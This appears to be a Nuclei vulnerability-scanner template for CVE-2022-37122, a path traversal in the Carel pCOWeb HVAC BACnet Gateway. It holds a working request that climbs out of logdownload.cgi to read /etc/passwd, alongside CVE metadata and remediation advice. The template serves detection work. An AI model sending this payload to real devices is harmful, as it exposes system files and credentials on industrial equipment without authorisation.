http:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  method: GET
  path:
  - '{{BaseURL}}/usr-cgi/logdownload.cgi?file=../../../../../../../../etc/passwd'
id: CVE-2022-37122
info:
  author: gy741
  classification:
    cve-id: CVE-2022-37122
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.97882
    epss-score: 0.53737
  description: 'Carel pCOWeb HVAC BACnet Gateway 2.1.0 contains an unauthenticated
    arbitrary file disclosure caused by improper verification of the ''file'' GET
    parameter in logdownload.cgi, letting attackers disclose sensitive files via directory
    traversal, exploit requires no authentication.

    '
  impact: 'Unauthenticated attackers can read arbitrary files from the Carel pCOWeb
    HVAC BACnet Gateway through directory traversal in the logdownload.cgi file parameter,
    potentially exposing sensitive configuration files, credentials, and HVAC system
    data.

    '
  metadata:
    max-request: 1
    product: pcoweb_hvac_bacnet_gateway
    vendor: carel
  name: Carel pCOWeb HVAC BACnet Gateway 2.1.0 - Path Traversal
  reference:
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5709.php
  - https://www.zeroscience.mk/codes/carelpco_dir.txt
  - https://packetstormsecurity.com/files/167684/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-37122
  remediation: 'Update Carel pCOWeb HVAC BACnet Gateway to a version later than 2.1.0
    that properly validates file paths in logdownload.cgi.

    '
  severity: high
  tags: cve,cve2022,carel,lfi,traversal,unauth,bacnet,vuln
